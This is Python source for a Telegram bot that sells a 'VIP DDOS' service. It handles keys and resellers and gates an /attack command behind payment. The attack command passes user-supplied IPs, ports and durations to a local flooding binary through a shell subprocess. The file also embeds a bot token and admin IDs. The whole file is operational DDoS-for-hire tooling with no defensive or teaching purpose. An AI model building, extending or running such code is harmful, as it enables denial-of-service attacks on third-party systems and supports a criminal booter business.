import os
import json
import time
import telebot
import datetime
import subprocess
import threading
from dateutil.relativedelta import relativedelta

# Telegram bot token
bot = telebot.TeleBot('7564493380:AAEjc8jXOqBZAwNNZU8sVyiOoFu8K6vY-cg')  # Replace with your bot token

# Admin user IDs
admin_id = {"1807014348", "6258297180"}  # Replace with your admin Telegram ID

# Files for data storage
USER_FILE = "users.json"
LOG_FILE = "log.txt"
KEY_FILE = "keys.json"
RESELLERS_FILE = "resellers.json"
AUTHORIZED_USERS_FILE = "authorized_users.json"  # New file for users added via /add

# Per key cost for resellers
KEY_COST = {"1h": 10, "1d": 100, "7d": 450, "1m": 900}

# In-memory storage
users = {}
keys = {}
authorized_users = {}  # New dictionary for users with manual access
last_attack_time = {}
COOLDOWN_PERIOD = 60  # Default cooldown period in seconds

def set_cooldown(seconds):
    """Set the global cooldown period."""
    global COOLDOWN_PERIOD
    COOLDOWN_PERIOD = seconds
    with open("cooldown.json", "w") as file:
        json.dump({"cooldown": seconds}, file)

def load_cooldown():
    """Load the cooldown period from file."""
    global COOLDOWN_PERIOD
    try:
        with open("cooldown.json", "r") as file:
            data = json.load(file)
            COOLDOWN_PERIOD = data.get("cooldown", 60)
    except FileNotFoundError:
        COOLDOWN_PERIOD = 60

# Load data
def load_data():
    global users, keys, authorized_users
    users = read_users()
    keys = read_keys()
    authorized_users = read_authorized_users()
    load_cooldown()

def read_users():
    try:
        with open(USER_FILE, "r") as file:
            return json.load(file)
    except FileNotFoundError:
        return {}

def save_users():
    with open(USER_FILE, "w") as file:
        json.dump(users, file)

def read_keys():
    try:
        with open(KEY_FILE, "r") as file:
            return json.load(file)
    except FileNotFoundError:
        return {}

def save_keys():
    with open(KEY_FILE, "w") as file:
        json.dump(keys, file)

def read_authorized_users():
    try:
        with open(AUTHORIZED_USERS_FILE, "r") as file:
            return json.load(file)
    except FileNotFoundError:
        return {}

def save_authorized_users():
    with open(AUTHORIZED_USERS_FILE, "w") as file:
        json.dump(authorized_users, file)

def parse_duration(duration_str):
    """Parse duration string (e.g., 1h, 1d, 1m, 1hours, 1days, 1months) and return hours, days, months."""
    duration_str = duration_str.lower()
    duration_str = duration_str.replace("hours", "h").replace("days", "d").replace("months", "m")
    import re
    match = re.match(r"(\d+)([hdm])", duration_str)
    if not match:
        return None, None, None
    value = int(match.group(1))
    unit = match.group(2)
    if unit == "h":
        return value, 0, 0
    elif unit == "d":
        return 0, value, 0
    elif unit == "m":
        return 0, 0, value
    return None, None, None

def add_time_to_current_date(years=0, months=0, days=0, hours=0, minutes=0, seconds=0):
    current_time = datetime.datetime.now()
    new_time = current_time + relativedelta(years=years, months=months, days=days, hours=hours, minutes=minutes, seconds=seconds)
    return new_time

# Load and save resellers
def load_resellers():
    try:
        with open(RESELLERS_FILE, "r") as file:
            return json.load(file)
    except FileNotFoundError:
        return {}
    except json.JSONDecodeError:
        return {}

def save_resellers(resellers):
    with open(RESELLERS_FILE, "w") as file:
        json.dump(resellers, file, indent=4)

resellers = load_resellers()

# Attack-related functions
def log_command(user_id, target, port, time):
    user_info = bot.get_chat(user_id)
    username = user_info.username if user_info.username else f"UserID: {user_id}"
    with open("log.txt", "a") as file:
        file.write(f"Username: {username}\nTarget: {target}\nPort: {port}\nTime: {time}\n\n")

def record_command_logs(user_id, command, target=None, port=None, time=None):
    log_entry = f"UserID: {user_id} | Time: {datetime.datetime.now()} | Command: {command}"
    if target:
        log_entry += f" | Target: {target}"
    if port:
        log_entry += f" | Port: {port}"
    if time:
        log_entry += f" | Time: {time}"
    with open("log.txt", "a") as file:
        log_entry += "\n"
        file.write(log_entry)

def execute_attack(target, port, time, chat_id, username, last_attack_time, user_id):
    try:
        packet_size = 1200
        if packet_size < 1 or packet_size > 65507:
            bot.send_message(chat_id, "Error: Packet size must be between 1 and 65507")
            return
        full_command = f"./Rohan {target} {port} {time} {packet_size}"
        response = f"Attack Sent Successfully\nTarget: {target}:{port}\nTime: {time} seconds\nPacket Size: {packet_size} bytes\nThreads: 512\nAttacker: @{username}"
        bot.send_message(chat_id, response)
        subprocess.Popen(full_command, shell=True)
        threading.Timer(time, send_attack_finished_message, [chat_id]).start()
        last_attack_time[user_id] = datetime.datetime.now()
    except Exception as e:
        bot.send_message(chat_id, f"Error executing attack: {str(e)}")

def send_attack_finished_message(chat_id):
    bot.send_message(chat_id, "Attack completed")

# Admin command to add reseller
@bot.message_handler(commands=['addreseller'])
def add_reseller(message):
    user_id = str(message.from_user.id)
    if user_id not in admin_id:
        bot.reply_to(message, "Access Denied: Admin only command")
        return
    command = message.text.split()
    if len(command) != 3:
        bot.reply_to(message, "Usage: /addreseller <user_id> <balance>")
        return
    reseller_id = command[1]
    try:
        initial_balance = int(command[2])
    except ValueError:
        bot.reply_to(message, "Invalid balance amount")
        return
    if reseller_id not in resellers:
        resellers[reseller_id] = initial_balance
        save_resellers(resellers)
        bot.reply_to(message, f"Reseller added successfully\nReseller ID: {reseller_id}\nBalance: {initial_balance} Rs")
    else:
        bot.reply_to(message, f"Reseller {reseller_id} already exists")

# Command to generate keys (for admins and resellers)
@bot.message_handler(commands=['genkey'])
def generate_key(message):
    user_id = str(message.from_user.id)
    command = message.text.split()

    # Check user role and validate command syntax
    if user_id in admin_id:
        # Admin syntax: /genkey <duration> <key_name>
        if len(command) != 3:
            bot.reply_to(message, "Usage for admins: /genkey <duration> <key_name>\nExample: /genkey 1d rahul")
            return
        duration = command[1].lower()
        key_name = command[2]
    elif user_id in resellers:
        # Reseller syntax: /genkey <duration> <key_name>
        if len(command) != 3:
            bot.reply_to(message, "Usage for resellers: /genkey <duration> <key_name>\nExample: /genkey 1d rahul")
            return
        duration = command[1].lower()
        key_name = command[2]
    else:
        bot.reply_to(message, "Access Denied: Admin or reseller only command")
        return

    # Parse and validate duration
    hours, days, months = parse_duration(duration)
    if hours is None:
        bot.reply_to(message, "Invalid duration. Use formats like 1h, 1d, 1m, 1hours, 1days, 1months")
        return

    # Normalize duration for KEY_COST lookup (e.g., 24h -> 1d, 30d -> 1m)
    cost_duration = duration
    if hours >= 24:
        days = hours // 24
        hours = 0
        duration = f"{days}d"
        cost_duration = duration
    if days >= 30:
        months = days // 30
        days = 0
        duration = f"{months}m"
        cost_duration = duration
    if months > 0:
        cost_duration = "1m" if months == 1 else f"{months}m"
    elif days > 0:
        cost_duration = "1d" if days == 1 else f"{days}d"
    elif hours > 0:
        cost_duration = "1h" if hours == 1 else f"{hours}h"

    # Generate custom key name
    custom_key = f"Rahul_sadiq-{key_name}"

    # Check if key name already exists
    if custom_key in keys:
        bot.reply_to(message, f"Key '{custom_key}' already exists. Please choose a different name.")
        return

    # Generate key
    device_limit = 1  # Default device limit
    if user_id in admin_id:
        keys[custom_key] = {
            "duration": duration,
            "device_limit": device_limit,
            "devices": [],
            "blocked": False
        }
        save_keys()
        response = f"Key generated successfully\nKey: `{custom_key}`\nDuration: {duration}\nDevice Limit: {device_limit}"
    elif user_id in resellers:
        # Check reseller balance
        if cost_duration not in KEY_COST:
            bot.reply_to(message, "Invalid duration for cost calculation")
            return
        cost = KEY_COST[cost_duration]
        if resellers[user_id] >= cost:
            resellers[user_id] -= cost
            save_resellers(resellers)
            keys[custom_key] = {
                "duration": duration,
                "device_limit": device_limit,
                "devices": [],
                "blocked": False
            }
            save_keys()
            response = f"Key generated successfully\nKey: `{custom_key}`\nDuration: {duration}\nDevice Limit: {device_limit}\nCost: {cost} Rs\nRemaining balance: {resellers[user_id]} Rs"
        else:
            response = f"Insufficient balance to generate {duration} key\nRequired: {cost} Rs\nAvailable: {resellers[user_id]} Rs"
    bot.reply_to(message, response, parse_mode='Markdown')

# Help command - Accessible to everyone
@bot.message_handler(commands=['help'])
def help_command(message):
    user_id = str(message.from_user.id)
    # Admin help message
    if user_id in admin_id:
        help_text = """
ULTRA PRO MAX ADMIN PANEL
BOT CONTROLS:
- /start - Start the bot for everyone 
- /help - Show this guide for everyone 
POWER MANAGEMENT:
- /attack <ip> <port> <time> - Launch an attack for admin and access user only
- /setcooldown <seconds> - Set the attack cooldown period admin only
- /checkcooldown - Check the current cooldown period for everyone 
- /addreseller <userid> <balance> - Add a new reseller admin only 
- /genkey <duration> <key_name> - Generate a key
- /logs - View recent logs
- /users - List authorized users
- /add <user_id> - Add user ID to give access for attack without need key
- /remove <userid> - Remove a user
- /resellers - View resellers for everyone 
- /addbalance <resellerid> <amount> - Add balance to a reseller admin only 
- /removereseller <resellerid> - Remove a reseller admin only 
- /block <key_name> - Block key name for admin only
EXAMPLE:
- /genkey 1day rahul - Generate a 1-day key (Key: Rahul_sadiq-rahul)
- /attack 192.168.1.1 80 120 - Launch an attack for admin and access user only
- /setcooldown 120 - Set cooldown to 120 seconds only admin
- /checkcooldown - View current cooldown for everyone 
Buy key from @Rahul_618
Any problem contect to @Rahul_618
"""
    # Reseller help message
    elif user_id in resellers:
        help_text = """
RESELLER HELP GUIDE
- /start - Start the bot
- /help - Show this guide
- /genkey <duration> <key_name> - Generate a key (1h, 1d, 7d, 1m)
- /balance - Check your reseller balance
- /myinfo - View your user information
- /checkcooldown - Check the current cooldown period
- /resellers - View resellers
EXAMPLE:
- /genkey 1day rahul - Generate a 1-day key (Key: Rahul_sadiq-rahul)
Buy key from @Rahul_618
Any problem contect to @Rahul_618
"""
    # User/Guest help message
    else:
        has_active_access = False
        if user_id in users or user_id in authorized_users:
            if user_id in users:
                try:
                    expiration_date = datetime.datetime.strptime(users[user_id], '%Y-%m-%d %H:%M:%S')
                    if datetime.datetime.now() < expiration_date:
                        has_active_access = True
                except ValueError:
                    has_active_access = False
            else:
                has_active_access = True  # Authorized users have access
        help_text = """
USER HELP GUIDE
- /start - Start the bot
- /help - Show this guide
- /redeem - Redeem a key for access
- /attack <ip> <port> <time> - Launch an attack (if authorized)
- /checkcooldown - Check the current cooldown period
- /myinfo - View your user information
- /resellers - View resellers
EXAMPLE:
- /attack 192.168.1.1 80 120 - Launch an attack (if authorized)
"""
        if not has_active_access:
            help_text += "Note: You need an active key or authorization to use attack features. Buy access for 50₹. Make payment and DM @Rahul_618 to get a key.\n"
        help_text += "Buy key from @Rahul_618\nAny problem contect to @Rahul_618"
    bot.reply_to(message, help_text, parse_mode='Markdown')

# Reseller balance check
@bot.message_handler(commands=['balance'])
def check_balance(message):
    user_id = str(message.from_user.id)
    if user_id in resellers:
        current_balance = resellers[user_id]
        response = f"Your current balance is: {current_balance}."
    else:
        response = "Access Denied: reseller only command"
    bot.reply_to(message, response)

# Redeem key - Allow non-active users only
@bot.message_handler(commands=['redeem'])
def redeem_key_prompt(message):
    user_id = str(message.from_user.id)
    if user_id in admin_id or (user_id in authorized_users and not users.get(user_id)):
        bot.reply_to(message, "Admin/Authorized User: Please send your key to redeem (e.g., Rahul_sadiq-rahul):")
        bot.register_next_step_handler(message, process_redeem_key)
        return
    if user_id in users:
        try:
            expiration_date = datetime.datetime.strptime(users[user_id], '%Y-%m-%d %H:%M:%S')
            if datetime.datetime.now() < expiration_date:
                bot.reply_to(message, f"You already have an active key!\nYour access expires on: {users[user_id]}\nPlease wait until it expires to redeem a new key. To extend access, buy a new key for 50₹ after expiration and DM @Rahul_618.")
                return
            else:
                bot.reply_to(message, "Your previous access has expired. Please send your new key to redeem (e.g., Rahul_sadiq-rahul):")
                bot.register_next_step_handler(message, process_redeem_key)
        except ValueError:
            bot.reply_to(message, "Error: Invalid expiration date format in your user data. Contact the admin: @rahul_618")
            return
    else:
        bot.reply_to(message, "Welcome! Please send your key to gain access (e.g., Rahul_sadiq-rahul):")
        bot.register_next_step_handler(message, process_redeem_key)

def process_redeem_key(message):
    user_id = str(message.from_user.id)
    key = message.text.strip()
    if key in keys:
        if keys[key]["blocked"]:
            bot.reply_to(message, "This key has been blocked. Contact the admin: @Rahul_618")
            return
        if len(keys[key]["devices"]) >= keys[key]["device_limit"]:
            bot.reply_to(message, "Key has reached its device limit.")
            return
        if user_id in keys[key]["devices"]:
            bot.reply_to(message, "You have already redeemed this key.")
            return
        if user_id in users:
            try:
                current_expiration = datetime.datetime.strptime(users[user_id], '%Y-%m-%d %H:%M:%S')
                if datetime.datetime.now() < current_expiration:
                    bot.reply_to(message, "You already have active access. Cannot redeem a new key.")
                    return
                else:
                    del users[user_id]
                    save_users()
            except ValueError:
                bot.reply_to(message, "Error: Invalid expiration date format in your user data. Contact the admin: @rahul_618")
                return
        duration = keys[key]["duration"]
        hours, days, months = parse_duration(duration)
        if hours is None:
            bot.reply_to(message, "Invalid duration in key. Contact the admin: @rahul_618")
            return
        expiration_time = add_time_to_current_date(months=months, days=days, hours=hours)
        users[user_id] = expiration_time.strftime('%Y-%m-%d %H:%M:%S')
        keys[key]["devices"].append(user_id)
        if len(keys[key]["devices"]) >= keys[key]["device_limit"]:
            del keys[key]
        save_users()
        save_keys()
        bot.reply_to(message, f"Access granted successfully!\nYour access expires on: {users[user_id]}")
    else:
        bot.reply_to(message, "Invalid or expired key! Buy a new key for 50₹. Make payment and DM @Rahul_618.")

# Block key command - Admin only
@bot.message_handler(commands=['block'])
def block_key(message):
    user_id = str(message.from_user.id)
    if user_id not in admin_id:
        bot.reply_to(message, "Access Denied: Admin only command")
        return
    command = message.text.split()
    if len(command) != 2:
        bot.reply_to(message, "Usage: /block <key_name>\nExample: /block Rahul_sadiq-rahul")
        return
    key_name = command[1]
    if key_name in keys:
        keys[key_name]["blocked"] = True
        save_keys()
        bot.reply_to(message, f"Key '{key_name}' has been blocked successfully.")
    else:
        bot.reply_to(message, f"Key '{key_name}' not found.")

# Add user with manual access - Admin only
@bot.message_handler(commands=['add'])
def add_user(message):
    user_id = str(message.from_user.id)
    if user_id not in admin_id:
        bot.reply_to(message, "Access Denied: Admin only command")
        return
    command = message.text.split()
    if len(command) != 2:
        bot.reply_to(message, "Usage: /add <user_id>\nExample: /add 1807014348")
        return
    target_user_id = command[1]
    if target_user_id in authorized_users:
        bot.reply_to(message, f"User {target_user_id} is already authorized.")
        return
    expiration_time = add_time_to_current_date(months=1)  # Default 1-month access
    authorized_users[target_user_id] = expiration_time.strftime('%Y-%m-%d %H:%M:%S')
    save_authorized_users()
    bot.reply_to(message, f"User {target_user_id} added with access until {authorized_users[target_user_id]}")

# Show logs
@bot.message_handler(commands=['logs'])
def show_recent_logs(message):
    user_id = str(message.from_user.id)
    if user_id in admin_id:
        if os.path.exists(LOG_FILE) and os.stat(LOG_FILE).st_size > 0:
            try:
                with open(LOG_FILE, "rb") as file:
                    bot.send_document(message.chat.id, file)
            except FileNotFoundError:
                bot.reply_to(message, "No data found")
        else:
            bot.reply_to(message, "No data found")
    else:
        bot.reply_to(message, "Access Denied: Admin only command")

# Start command - Accessible to everyone
@bot.message_handler(commands=['start'])
def start_command(message):
    user_id = str(message.from_user.id)
    has_active_access = False
    if user_id in admin_id or user_id in users or user_id in authorized_users:
        if user_id in users:
            try:
                expiration_date = datetime.datetime.strptime(users[user_id], '%Y-%m-%d %H:%M:%S')
                if datetime.datetime.now() < expiration_date:
                    has_active_access = True
            except ValueError:
                has_active_access = False
        elif user_id in authorized_users:
            try:
                expiration_date = datetime.datetime.strptime(authorized_users[user_id], '%Y-%m-%d %H:%M:%S')
                if datetime.datetime.now() < expiration_date:
                    has_active_access = True
            except ValueError:
                has_active_access = False
        else:
            has_active_access = True  # Admins always have access
    response = "WELCOME TO VIP DDOS\nUse /help to see available commands"
    if not has_active_access:
        response += "\nTo use attack features, buy access for 50₹. Make payment and DM @Rahul_618 to get a key or ask an admin to authorize you."
    bot.reply_to(message, response)

# Attack command with admin bypass
@bot.message_handler(commands=['attack'])
def handle_attack(message):
    user_id = str(message.from_user.id)
    has_access = False
    if user_id in admin_id:
        has_access = True
    elif user_id in users:
        try:
            expiration_date = datetime.datetime.strptime(users[user_id], '%Y-%m-%d %H:%M:%S')
            if datetime.datetime.now() < expiration_date:
                has_access = True
        except ValueError:
            has_access = False
    elif user_id in authorized_users:
        try:
            expiration_date = datetime.datetime.strptime(authorized_users[user_id], '%Y-%m-%d %H:%M:%S')
            if datetime.datetime.now() < expiration_date:
                has_access = True
        except ValueError:
            has_access = False
    if not has_access:
        bot.reply_to(message, "Unauthorized Access! Buy access for 50₹. Make payment and DM @Rahul_618 to get a key or ask an admin to authorize you.")
        return
    if user_id in last_attack_time:
        time_since_last_attack = (datetime.datetime.now() - last_attack_time[user_id]).total_seconds()
        if time_since_last_attack < COOLDOWN_PERIOD:
            remaining_cooldown = COOLDOWN_PERIOD - time_since_last_attack
            bot.reply_to(message, f"Cooldown in effect, wait {int(remaining_cooldown)} seconds")
            return
    command = message.text.split()
    if len(command) != 4:
        bot.reply_to(message, "Usage: /attack <ip> <port> <time>")
        return
    target = command[1]
    try:
        port = int(command[2])
        time = int(command[3])
        if time > 900:
            bot.reply_to(message, "Error: use less than 900 seconds")
            return
        record_command_logs(user_id, 'attack', target, port, time)
        log_command(user_id, target, port, time)
        username = message.from_user.username or "No username"
        execute_attack(target, port, time, message.chat.id, username, last_attack_time, user_id)
    except ValueError:
        bot.reply_to(message, "Invalid port or time format.")

# Set cooldown command
@bot.message_handler(commands=['setcooldown'])
def set_cooldown_command(message):
    user_id = str(message.from_user.id)
    if user_id not in admin_id:
        bot.reply_to(message, "Access Denied: Admin only command")
        return
    command = message.text.split()
    if len(command) != 2:
        bot.reply_to(message, "Usage: /setcooldown <seconds>")
        return
    try:
        seconds = int(command[1])
        if seconds < 0:
            bot.reply_to(message, "Cooldown must be non-negative")
            return
        set_cooldown(seconds)
        bot.reply_to(message, f"Cooldown set to {seconds} seconds")
    except ValueError:
        bot.reply_to(message, "Invalid cooldown value. Please provide a number.")

# Check cooldown command
@bot.message_handler(commands=['checkcooldown'])
def check_cooldown_command(message):
    bot.reply_to(message, f"Current cooldown period: {COOLDOWN_PERIOD} seconds")

# My info
@bot.message_handler(commands=['myinfo'])
def my_info(message):
    user_id = str(message.from_user.id)
    username = message.from_user.username or "No username"
    my_key = "No key"
    role = "Guest"
    expiration = "No expiration"
    
    if user_id in admin_id:
        role = "Admin"
    elif user_id in resellers:
        role = "Reseller"
        balance = resellers.get(user_id, 0)
    elif user_id in users:
        role = "User"
        try:
            expiration = users[user_id]
            my_key = [k for k, v in keys.items() if user_id in v["devices"] and not v["blocked"]][0] if any(user_id in v["devices"] for v in keys.values()) else "No key"
        except (ValueError, IndexError):
            expiration = "Invalid expiration"
    elif user_id in authorized_users:
        role = "Authorized User"
        try:
            expiration = authorized_users[user_id]
        except ValueError:
            expiration = "Invalid expiration"

    response = (
        f"USER INFORMATION\n"
        f"Username: @{username}\n"
        f"UserID: {user_id}\n"
        f"My key: {my_key}\n"
        f"Role: {role}\n"
        f"Expiration: {expiration}\n"
    )
    if role == "Reseller":
        response += f"Balance: {balance} Rs\n"
    response += "Buy key from @Rahul_618\nAny problem contect to @Rahul_618"
    bot.reply_to(message, response)

# List users
@bot.message_handler(commands=['users'])
def list_authorized_users(message):
    user_id = str(message.from_user.id)
    if user_id not in admin_id:
        bot.reply_to(message, "Access Denied: Admin only command")
        return
    response = "Authorized Users\n"
    all_users = {**users, **authorized_users}
    if all_users:
        for user, expiration in all_users.items():
            expiration_date = datetime.datetime.strptime(expiration, '%Y-%m-%d %H:%M:%S')
            formatted_expiration = expiration_date.strftime('%Y-%m-%d %H:%M:%S')
            user_info = bot.get_chat(user)
            username = user_info.username if user_info.username else user_info.first_name
            response += f"User ID: {user}\nUsername: @{username}\nExpires On: {formatted_expiration}\n"
    else:
        response = "No authorized users found."
    bot.reply_to(message, response, parse_mode='Markdown')

# Remove user
@bot.message_handler(commands=['remove'])
def remove_user(message):
    user_id = str(message.from_user.id)
    if user_id not in admin_id:
        bot.reply_to(message, "Access Denied: Admin only command")
        return
    command = message.text.split()
    if len(command) != 2:
        bot.reply_to(message, "Usage: /remove <user_id>")
        return
    target_user_id = command[1]
    if target_user_id in users:
        del users[target_user_id]
        save_users()
        response = f"User {target_user_id} removed from key-based access."
    elif target_user_id in authorized_users:
        del authorized_users[target_user_id]
        save_authorized_users()
        response = f"User {target_user_id} removed from authorized access."
    else:
        response = f"User {target_user_id} not found in authorized users."
    bot.reply_to(message, response)

# Show resellers
@bot.message_handler(commands=['resellers'])
def show_resellers(message):
    resellers_info = "Authorized Resellers\n"
    if resellers:
        for reseller_id, balance in resellers.items():
            reseller_username = bot.get_chat(reseller_id).username if bot.get_chat(reseller_id) else "Unknown"
            resellers_info += f"Username: {reseller_username}\nUserID: {reseller_id}\nBalance: {balance} Rs\n"
    else:
        resellers_info += "No reseller found"
    bot.reply_to(message, resellers_info)

# Add balance
@bot.message_handler(commands=['addbalance'])
def add_balance(message):
    user_id = str(message.from_user.id)
    if user_id not in admin_id:
        bot.reply_to(message, "Access Denied: Admin only command")
        return
    command_parts = message.text.split()
    if len(command_parts) != 3:
        bot.reply_to(message, "Usage: /addbalance <reseller_id> <amount>")
        return
    reseller_id = command_parts[1]
    try:
        amount = float(command_parts[2])
        if reseller_id not in resellers:
            bot.reply_to(message, "Reseller ID not found")
            return
        resellers[reseller_id] += amount
        save_resellers(resellers)
        bot.reply_to(message, f"Balance Successfully added\nBalance: {amount} Rs\nReseller ID: {reseller_id}\nNew balance: {resellers[reseller_id]} Rs")
    except ValueError:
        bot.reply_to(message, "Invalid amount")

# Remove reseller
@bot.message_handler(commands=['removereseller'])
def remove_reseller(message):
    user_id = str(message.from_user.id)
    if user_id not in admin_id:
        bot.reply_to(message, "Access Denied: Admin only command")
        return
    command_parts = message.text.split()
    if len(command_parts) != 2:
        bot.reply_to(message, "Usage: /remove_reseller <reseller_id>")
        return
    reseller_id = command_parts[1]
    if reseller_id not in resellers:
        bot.reply_to(message, "Reseller ID not found.")
        return
    del resellers[reseller_id]
    save_resellers(resellers)
    bot.reply_to(message, f"Reseller {reseller_id} has been removed successfully")

if __name__ == "__main__":
    load_data()
    while True:
        try:
            bot.polling(none_stop=True)
        except Exception as e:
            print(e)
            time.sleep(1)